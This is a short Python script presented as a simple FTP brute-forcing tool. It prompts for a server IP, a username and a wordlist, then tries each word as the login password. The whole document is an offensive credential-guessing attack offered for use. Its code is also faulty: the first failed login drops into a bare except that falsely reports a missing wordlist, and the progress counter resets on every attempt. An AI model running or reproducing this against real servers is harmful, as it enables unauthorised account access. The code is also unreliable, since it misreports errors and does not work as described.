# ////////////////////////
# ************************
#
# Simple FTP bruteforcing script.
#
# ************************
# ////////////////////////

import ftplib
import time

IP = input(f'Please enter IP address of the FTP server: ')

user = input(f'Enter username: ')

PassList = input(f'Wordlist path:')

try:
    
    with open(PassList, 'r') as list:
        for word in list:

            word = word.strip('\r').strip('\n')
            conn = ftplib.FTP(IP)
            conn.login(user,word)
            print(f'Correct password for user {user} is: {word}')

            # Printing that attack is in progress every 10 attempts.
            count = 0
            if count%10 == 0:
                print(f'Attacking...')

except:
    print(f'No valid wordlist provided!')
